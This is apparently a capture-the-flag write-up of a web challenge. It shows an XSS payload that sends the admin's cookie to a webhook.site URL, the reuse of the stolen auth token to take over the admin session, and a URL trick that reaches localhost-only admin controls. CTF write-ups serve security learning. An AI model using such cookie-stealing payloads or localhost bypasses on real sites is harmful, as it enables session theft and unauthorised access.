# Approach
- We were prompted with a chat box with admin, which hints to possible XSS vulnerability. After trying the following
```javascript
<img src =asdf onerror="$.get('https://webhook.site/****'+ bota(document.cookie))">
```
- and upon inspecting the HTTP request sent to the request bin, since I convert the string into base64 so that I wouldnt get any escaped string until later inspection.
- The Base64 encoded cookie I got was `ZmxhZz1DVEZ7M21icjRjM190aGVfYzAwazFlX3cwcjFkX29yZDNyfTsgYXV0aD1UVXRiOVBQQTljWWtmY1ZRV1l6eHk0WGJ0eUwzVk5Leg=%3D`
- We know that `%` is the escape character and the two characters following it are the hexadecimal numbering of the ASCII character. `%3D` represents a `=`, and we know that all base64 encoding ends with 1 or 2 `=` (Used as an indication of termination and for padding since base64 works in a multiple of 3 characters)
- After decoding it, we see the first flag and an auth token
# First Flag
CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r} auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz

# Second Flag Apporach
- After we got the auth token from the decoded cookie, I set my own browser with that cookie with `document.cookie="auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz"`.
- After refreshing the page, the admin tab showed up. However, the admin page only shows that in order to access it, we need to be in the local host `127.0.0.1`. 
- In order to access the admin control via admin's local host, I went back to the home page that was fetching the video live stream and replaced the livestream url with 
`http://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com@127.0.0.1/admin/controls` because the server is looking for localhost `127.0.0.1` in the host name and `http://cwo-xss.web.ctfcompetition.com` in the domain.

# Second Flag
CTF{WhatIsThisCookieFriendSpaceBookPlusAllAccessRedPremiumThingLooksYummy}

